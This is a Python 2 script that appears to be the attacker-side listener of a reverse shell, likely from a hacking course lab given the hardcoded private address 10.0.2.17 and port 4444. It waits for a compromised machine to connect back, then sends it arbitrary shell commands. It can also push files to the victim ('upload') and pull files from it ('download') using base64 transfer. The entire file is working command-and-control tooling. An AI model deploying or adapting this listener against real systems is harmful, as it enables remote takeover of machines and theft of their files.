#!/usr/bin/python
import socket, json, base64   

class MyListener:
	def __init__(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((ip, port))
		listener.listen(0)

		print("[+] Waiting for incoming connection! ")

		self.connection, address = listener.accept()

		print("[+] Have connection from IP: " + str(address[0]) + "  port: " + str(address[1]))

	def send_data(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def receive_data(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def executed_from_other_side(self, command):
		self.send_data(command)

		if command[0] == "exit":
			self.connection.close()
			exit()

		return self.receive_data()

	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))

			return "[+] Downloaded successfully!."

	def read_file(self, path):
		with open(path, "rb") as file:

			return base64.b64encode(file.read())

	def run(self):
		while True:
			command = raw_input("command >> ")       
			if "," not in command:
				command = command.split(" ")
			else:
				command = command.split(",")

			try:
				if command[0] == "upload":
					file_content = self.read_file(command[1])
					command.append(file_content)
				elif command[0] == "cd" and len(command) > 2:
					command[1] = " ".join(command[1:])
				result = self.executed_from_other_side(command)

				if command[0] == "download" and "[!] An error occurred." not in result:
					result = self.write_file(command[1], result)
					
			except Exception:
				result = "[!] An error occurred."

			print(result)


if __name__ == '__main__':

	my_listener = MyListener("10.0.2.17", 4444)
	my_listener.run()

